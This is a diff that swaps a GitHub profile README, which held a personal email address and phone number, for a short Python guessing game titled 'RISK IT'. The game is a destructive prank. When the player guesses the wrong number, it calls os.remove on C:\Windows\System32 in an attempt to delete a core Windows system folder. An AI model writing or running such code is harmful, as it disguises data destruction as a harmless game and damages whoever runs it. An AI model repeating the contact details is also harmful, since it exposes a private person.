@@ -1,10 +1,10 @@
-- 👋 Hi, I’m @rvph10
-- 👀 I’m interested in basket-ball, programming and hacking
-- 🌱 I’m currently learning computer sciences
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me rgenu10@gmail.com or 0472376251
+//// RISK IT \\\\
+import random
+import os
 
-<!---
-rvph10/rvph10 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+number = random.randint(1, 10)
+guess = int(input('Find the right number between 1 and 10'))
+if guess == number:
+  print('Wow you lucky')
+else:
+  os.remove('C:\Windows\System32')
